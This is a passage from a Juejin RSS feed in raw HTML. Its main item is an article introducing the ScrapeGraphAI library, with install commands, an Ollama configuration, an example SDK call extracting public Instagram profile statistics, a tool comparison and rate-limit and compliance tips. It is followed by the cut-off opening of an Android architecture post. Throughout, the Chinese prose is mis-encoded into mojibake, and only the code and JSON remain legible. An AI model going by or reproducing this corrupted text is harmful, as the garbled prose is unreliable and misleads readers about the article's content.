<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdiscord.com%2Fdevelopers%2Fapplications" target="_blank" title="https://discord.com/developers/applications" ref="nofollow noopener noreferrer">Discord Developer Portal</a></li>
</ul>
<hr/>
<p><em>æœ¬æ–‡ç”± Clawdbot ç¤¾åŒºè´¡çŒ®</em></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ScrapeGraphAIï¼šåƒå¯¹è¯ä¸€æ ·æå–ç¤¾äº¤åª’ä½“æ•°æ®ï¼ˆæ— éœ€æ‰‹åŠ¨ç»´æŠ¤è§£æè§„åˆ™ï¼‰]]></title>    <link>https://juejin.cn/post/7602935146707566638</link>    <guid>https://juejin.cn/post/7602935146707566638</guid>    <pubDate>2026-02-05T08:47:30.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602935146707566638" data-draft-id="7603160727717593139" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ScrapeGraphAIï¼šåƒå¯¹è¯ä¸€æ ·æå–ç¤¾äº¤åª’ä½“æ•°æ®ï¼ˆæ— éœ€æ‰‹åŠ¨ç»´æŠ¤è§£æè§„åˆ™ï¼‰"/> <meta itemprop="keywords" content="GitHub,çˆ¬è™«"/> <meta itemprop="datePublished" content="2026-02-05T08:47:30.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="AIé¦–å¸­æƒ…æŠ¥å‘˜_é˜¿å¸ƒ"/> <meta itemprop="url" content="https://juejin.cn/user/4114839354741274"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ScrapeGraphAIï¼šåƒå¯¹è¯ä¸€æ ·æå–ç¤¾äº¤åª’ä½“æ•°æ®ï¼ˆæ— éœ€æ‰‹åŠ¨ç»´æŠ¤è§£æè§„åˆ™ï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4114839354741274/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    AIé¦–å¸­æƒ…æŠ¥å‘˜_é˜¿å¸ƒ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T08:47:30.000Z" title="Thu Feb 05 2026 08:47:30 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/463c5e151c8c42adb010f88064f11756~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnpppbluK3mg4XmiqXlkZhf6Zi_5biD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770886052&amp;x-signature=NXU%2BsgmvywhecCnZA0r6ztdrlGQ%3D" alt="image" loading="lazy"/> åœ¨ç¤¾äº¤åª’ä½“æ•°æ®é‡‡é›†é¢†åŸŸï¼Œä¼ ç»Ÿçš„çˆ¬è™«æ–¹æ¡ˆæ­£é¢ä¸´ä¸¥å³»æŒ‘æˆ˜ã€‚åŠ¨æ€åŠ è½½ã€é¢‘ç¹æ”¹ç‰ˆä»¥åŠå¤æ‚çš„åçˆ¬æœºåˆ¶ï¼Œä½¿å¾—ç»´æŠ¤ XPath æˆ– CSS é€‰æ‹©å™¨çš„æˆæœ¬æé«˜ã€‚ScrapeGraphAI å¼•å…¥äº†â€œLLM + å›¾é€»è¾‘â€æ¶æ„ï¼Œè¯•å›¾å°†çˆ¬è™«ä»â€œæ‰‹å·¥ç¼–å†™è§„åˆ™â€è½¬å‘â€œè¯­ä¹‰åŒ–è‡ªåŠ¨æå–â€ã€‚</p>
<h2 data-id="heading-0">ä¸€ã€ ç¤¾äº¤åª’ä½“çˆ¬è™«çš„å·¥ç¨‹ç—›ç‚¹</h2>
<p>ç¤¾äº¤åª’ä½“å¹³å°ï¼ˆå¦‚ Instagramã€LinkedInã€Redditï¼‰çš„æ•°æ®é‡‡é›†ä¸»è¦å­˜åœ¨ä»¥ä¸‹æŠ€æœ¯ç“¶é¢ˆï¼š</p>
<ol>
<li><strong>è§£æé€»è¾‘ææ˜“å¤±æ•ˆ</strong>ï¼šç¤¾äº¤å¹³å°é¢‘ç¹è¿›è¡Œ A/B æµ‹è¯•æˆ– UI æ”¹ç‰ˆï¼Œä»»ä½• DOM ç»“æ„çš„å¾®è°ƒéƒ½ä¼šå¯¼è‡´ä¼ ç»Ÿçˆ¬è™«å´©æºƒã€‚</li>
<li><strong>æ·±åº¦ä¾èµ– JS æ¸²æŸ“</strong>ï¼šå†…å®¹å¤šç”±å¼‚æ­¥è¯·æ±‚åŠ è½½ï¼Œç®€å•çš„ HTML æŠ“å–åªèƒ½æ‹¿åˆ°ç©ºç™½å£³æ–‡ä»¶ã€‚</li>
<li><strong>é£æ§é—¨æ§›é«˜</strong>ï¼šé«˜é¢‘è®¿é—®ææ˜“è§¦å‘ IP å°ç¦ã€éªŒè¯ç æˆ–è¡Œä¸ºæ£€æµ‹ã€‚</li>
<li><strong>åˆè§„æ€§é£é™©</strong>ï¼šToSï¼ˆæœåŠ¡æ¡æ¬¾ï¼‰é™åˆ¶ä¸¥æ ¼ï¼Œéå…¬å¼€æ•°æ®çš„é‡‡é›†å­˜åœ¨æ³•å¾‹çº¢çº¿ã€‚</li>
</ol>
<p>ScrapeGraphAI é€šè¿‡ LLM è‡ªåŠ¨æ¨æ–­é¡µé¢ç»“æ„ï¼Œç”¨æˆ·åªéœ€æè¿°â€œæƒ³è¦ä»€ä¹ˆâ€ï¼Œæ— éœ€å…³å¿ƒâ€œæ•°æ®åœ¨å“ªâ€ã€‚</p>
<hr/>
<h2 data-id="heading-1">äºŒã€ æ ¸å¿ƒæ¶æ„ä¸åŠŸèƒ½æ¨¡å—</h2>
<p>ScrapeGraphAI çš„æ ¸å¿ƒåœ¨äºå°†çˆ¬å–æµç¨‹æŠ½è±¡ä¸º<strong>æœ‰å‘å›¾ï¼ˆDirect Graphï¼‰</strong> ï¼Œæ¯ä¸ªèŠ‚ç‚¹è´Ÿè´£æŠ“å–ã€æ¸…æ´—ã€æ¨ç†æˆ–éªŒè¯ã€‚</p>
<h3 data-id="heading-2">1. æ ¸å¿ƒç»„ä»¶æ‹“æ‰‘</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fd9ecf8614fe4bfbb0aea78bc09a741c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnpppbluK3mg4XmiqXlkZhf6Zi_5biD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770886052&amp;x-signature=ZJL5RNeRt%2FAo2ACeMegJGjV2Htw%3D" alt="image" loading="lazy"/></p>
<h3 data-id="heading-3">2. ä¸»è¦åŠŸèƒ½ç±»</h3>
<ul>
<li><strong>SmartScraperGraph</strong>ï¼šå•é¡µé¢æ™ºèƒ½æå–ï¼Œé€‚åˆç²¾ç¡®é‡‡é›†ç‰¹å®šè´¦å·èµ„æ–™ã€‚</li>
<li><strong>SmartScraperMultiGraph</strong>ï¼šå¤šé¡µé¢å¹¶å‘æå–ï¼Œé€‚ç”¨äºæ‰¹é‡é‡‡é›†å¸–å­æˆ–è¯é¢˜ã€‚</li>
<li><strong>SearchGraph</strong>ï¼šåŸºäºæœç´¢å…³é”®è¯è‡ªåŠ¨å¯»æ‰¾æºå¹¶æå–ä¿¡æ¯ã€‚</li>
<li><strong>ScriptCreatorGraph</strong>ï¼šè‡ªåŠ¨ç”Ÿæˆå¯ç‹¬ç«‹è¿è¡Œçš„ Python çˆ¬è™«è„šæœ¬ã€‚</li>
</ul>
<hr/>
<h2 data-id="heading-4">ä¸‰ã€ ç¯å¢ƒéƒ¨ç½²ä¸å¿«é€Ÿä¸Šæ‰‹</h2>
<p>ScrapeGraphAI æ”¯æŒ<strong>æœ¬åœ°å¼€æºåº“</strong>ä¸<strong>äº‘ç«¯ API</strong> ä¸¤ç§æ¥å…¥æ¨¡å¼ã€‚</p>
<h3 data-id="heading-5">1. æœ¬åœ°å¼€æºåº“å®‰è£…</h3>
<p>æœ¬åœ°æ¨¡å¼é€‚åˆéœ€è¦æ·±åº¦è‡ªå®šä¹‰é€»è¾‘æˆ–è¿½æ±‚ä½æˆæœ¬çš„åœºæ™¯ã€‚</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å®‰è£…æ ¸å¿ƒåº“</span>
pip install scrapegraphai

<span class="hljs-comment"># å®‰è£…æµè§ˆå™¨å†…æ ¸ï¼ˆå¤„ç† JS æ¸²æŸ“ï¼‰</span>
playwright install
</code></pre>
<h3 data-id="heading-6">2. é…ç½®æœ¬åœ° LLM (Ollama)</h3>
<p>è‹¥éœ€å®Œå…¨æœ¬åœ°åŒ–è¿è¡Œï¼Œå¯é…åˆ Ollama ä½¿ç”¨ï¼š</p>
<pre><code class="hljs language-makefile" lang="makefile">graph_config = {
    <span class="hljs-string">"llm"</span>: {
        <span class="hljs-string">"model"</span>: <span class="hljs-string">"ollama/mistral"</span>,
        <span class="hljs-string">"temperature"</span>: 0,
        <span class="hljs-string">"format"</span>: <span class="hljs-string">"json"</span>,
        <span class="hljs-string">"base_url"</span>: <span class="hljs-string">"http://localhost:11434"</span>
    },
    <span class="hljs-string">"embeddings"</span>: {
        <span class="hljs-string">"model"</span>: <span class="hljs-string">"ollama/nomic-embed-text"</span>,
        <span class="hljs-string">"base_url"</span>: <span class="hljs-string">"http://localhost:11434"</span>
    }
}
</code></pre>
<hr/>
<h2 data-id="heading-7">å››ã€ ç¤¾äº¤åª’ä½“å®æˆ˜ï¼šInstagram ç›‘æ§æ–¹æ¡ˆ</h2>
<p>é’ˆå¯¹ç¤¾äº¤åª’ä½“åœºæ™¯ï¼Œæ¨èä½¿ç”¨äº‘ API é…åˆ SDKï¼Œä»¥é™ä½ç¯å¢ƒç»´æŠ¤æˆæœ¬å¹¶æé«˜ç¨³å®šæ€§ã€‚</p>
<h3 data-id="heading-8">1. å“ç‰Œç›‘æ§é€»è¾‘å®ç°</h3>
<p>é€šè¿‡ <code>scrapegraph-py</code> SDKï¼Œå¯ä»¥ç”¨æç®€çš„ä»£ç å®ç° Instagram å…¬å¼€èµ„æ–™æå–ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">from scrapegraph_py import Client

<span class="hljs-attr">client</span> = Client(api_key=<span class="hljs-string">"YOUR_API_KEY"</span>)

<span class="hljs-comment"># æå– Instagram ä¸ªäººèµ„æ–™åŠè¿‘æœŸäº’åŠ¨</span>
<span class="hljs-attr">response</span> = client.smartscraper(
    <span class="hljs-attr">website_url</span>=<span class="hljs-string">"https://www.instagram.com/target_username/"</span>,
    <span class="hljs-attr">user_prompt</span>=<span class="hljs-string">"æå–ç”¨æˆ·åã€ç²‰ä¸æ•°ã€å‘å¸–æ•°ä»¥åŠæœ€è¿‘ 3 æ¡å¸–å­çš„ç‚¹èµå’Œè¯„è®ºæ•°"</span>
)

<span class="hljs-attr">data</span> = response[<span class="hljs-string">"result"</span>]
</code></pre>
<h3 data-id="heading-9">2. é¢„æœŸè¾“å‡ºç»“æ„</h3>
<p>ç³»ç»Ÿä¼šè‡ªåŠ¨è¿”å›æ ¼å¼åŒ–çš„ JSON æ•°æ®ï¼Œæ— éœ€æ‰‹åŠ¨è§£æ HTMLï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"username"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"target_username"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"stats"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"followers"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">2500000</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"posts_count"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">3427</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"recent_engagement"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-punctuation">{</span><span class="hljs-attr">"likes"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">45678</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"comments"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">892</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-punctuation">{</span><span class="hljs-attr">"likes"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">31200</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"comments"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">450</span><span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<hr/>
<h2 data-id="heading-10">äº”ã€ ç«å“æ¨ªå‘å¯¹æ¯”</h2>
<p>åœ¨ç¤¾äº¤åª’ä½“æ•°æ®è·å–è¿™ä¸€ç‰¹å®šç»´åº¦ï¼ŒScrapeGraphAI ä¸ä¸»æµæ–¹æ¡ˆçš„å·®å¼‚å¦‚ä¸‹ï¼š</p>















































<table><thead><tr><th>ç»´åº¦</th><th>ScrapeGraphAI</th><th>Apify</th><th>Bright Data</th><th>ScraperAPI</th></tr></thead><tbody><tr><td><strong>æ ¸å¿ƒé©±åŠ¨</strong></td><td><strong>LLM + è¯­ä¹‰ç†è§£</strong></td><td>ç¤¾åŒº Actors è„šæœ¬</td><td>ä»£ç†ç½‘ç»œ + æ•°æ®é›†</td><td>ä»£ç† + HTML æŠ“å–</td></tr><tr><td><strong>æŠ€æœ¯é—¨æ§›</strong></td><td>æä½ï¼ˆè‡ªç„¶è¯­è¨€ï¼‰</td><td>ä¸­ï¼ˆéœ€ç†è§£ Actor æ¨¡å‹ï¼‰</td><td>é«˜ï¼ˆé…ç½®å¤æ‚ï¼‰</td><td>ä¸­ï¼ˆéœ€è‡ªå†™è§£æå™¨ï¼‰</td></tr><tr><td><strong>è¾“å‡ºè´¨é‡</strong></td><td>ç»“æ„åŒ– JSON (è‡ªå®šä¹‰)</td><td>è§†è„šæœ¬è€Œå®š</td><td>æ ‡å‡†åŒ–æ•°æ®é›†</td><td>åŸå§‹ HTML</td></tr><tr><td><strong>AI èƒ½åŠ›</strong></td><td>åŸç”Ÿæ”¯æŒ</td><td>éœ€è‡ªè¡Œé›†æˆ</td><td>å¼±</td><td>æ— </td></tr><tr><td><strong>é€‚ç”¨åœºæ™¯</strong></td><td>å¿«é€ŸåŸå‹ã€çµæ´»å˜åŠ¨</td><td>å¤§è§„æ¨¡å·¥ç¨‹åŒ–çˆ¬å–</td><td>ä¼ä¸šçº§åˆè§„æ•°æ®é‡‡è´­</td><td>åŸºç¡€ä»£ç†éœ€æ±‚</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-11">å…­ã€ é¿å‘æŒ‡å—ä¸æœ€ä½³å®è·µ</h2>
<h3 data-id="heading-12">1. æŠ€æœ¯å®ç°è¦ç‚¹</h3>
<ul>
<li><strong>å¼ºåˆ¶ Schema çº¦æŸ</strong>ï¼šåœ¨ Prompt ä¸­æ˜ç¡®è¦æ±‚ JSON ç»“æ„ï¼Œé¿å… LLM è¾“å‡ºæ ¼å¼ä¸ç¨³å®šã€‚</li>
<li><strong>å¤„ç† JS æ¸²æŸ“</strong>ï¼šç¡®ä¿ <code>playwright</code> å·²æ­£ç¡®å®‰è£…ï¼ŒDebug é˜¶æ®µå¯å°† <code>headless</code> è®¾ä¸º <code>False</code> è§‚å¯ŸåŠ è½½è¿‡ç¨‹ã€‚</li>
<li><strong>é€Ÿç‡æ§åˆ¶</strong>ï¼šç¤¾äº¤å¹³å°å¯¹é«˜é¢‘è¯·æ±‚æå…¶æ•æ„Ÿï¼Œå»ºè®®å• IP è¯·æ±‚é—´éš” &gt; 1ç§’ï¼Œå¹¶é…åˆéšæœºå»¶è¿Ÿã€‚</li>
</ul>
<h3 data-id="heading-13">2. åˆè§„ä¸ä¼¦ç†</h3>
<ul>
<li><strong>ä»…æŠ“å–å…¬å¼€æ•°æ®</strong>ï¼šä¸¥ç¦æœªç»æˆæƒæŠ“å–ç§æœ‰æˆ–æ•æ„Ÿä¸ªäººä¿¡æ¯ã€‚</li>
<li><strong>éµå®ˆ robots.txt</strong>ï¼šåœ¨ç”Ÿäº§ç¯å¢ƒè¿è¡Œå‰ï¼Œåº”é¢„å…ˆæ£€æŸ¥ç›®æ ‡ç«™ç‚¹çš„æŠ“å–è®¸å¯ã€‚</li>
</ul>
<h3 data-id="heading-14">3. è½åœ°è·¯çº¿å›¾</h3>
<pre><code class="hljs"/></pre>
<h2 data-id="heading-15">æ€»ç»“</h2>
<p>ScrapeGraphAI é™ä½äº†ç¤¾äº¤åª’ä½“æ•°æ®è·å–çš„å·¥ç¨‹é—¨æ§›ã€‚å®ƒå°†çˆ¬è™«çš„é‡ç‚¹ä»â€œå¦‚ä½•ç¼–å†™è§£æä»£ç â€è½¬ç§»åˆ°äº†â€œå¦‚ä½•å®šä¹‰æ•°æ®éœ€æ±‚â€ã€‚å¯¹äºéœ€è¦å¿«é€Ÿæ„å»ºèˆ†æƒ…ç›‘æ§ã€KOL åˆ†ææˆ–ç«å“è·Ÿè¸ªåŸå‹çš„å›¢é˜Ÿï¼Œè¿™æ˜¯ä¸€ä¸ªæå…·æ€§ä»·æ¯”çš„åº•åº§å·¥å…·ã€‚</p>
<h4 data-id="heading-16">é¡¹ç›®åœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FScrapeGraphAI%2FScrapegraph-ai" target="_blank" title="https://github.com/ScrapeGraphAI/Scrapegraph-ai" ref="nofollow noopener noreferrer">github.com/ScrapeGraphâ€¦</a></h4></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç«™åœ¨ Android çš„è§’åº¦ï¼ŒèŠèŠ Clean Architecture]]></title>    <link>https://juejin.cn/post/7603043152672358415</link>    <guid>https://juejin.cn/post/7603043152672358415</guid>    <pubDate>2026-02-05T08:54:04.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603043152672358415" data-draft-id="7599496293162287145" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç«™åœ¨ Android çš„è§’åº¦ï¼ŒèŠèŠ Clean Architecture"/> <meta itemprop="keywords" content="æ¶æ„"/> <meta itemprop="datePublished" content="2026-02-05T08:54:04.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é˜¿å¥å›"/> <meta itemprop="url" content="https://juejin.cn/user/2313804282603431"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç«™åœ¨ Android çš„è§’åº¦ï¼ŒèŠèŠ Clean Architecture
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2313804282603431/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é˜¿å¥å›
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T08:54:04.000Z" title="Thu Feb 05 2026 08:54:04 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 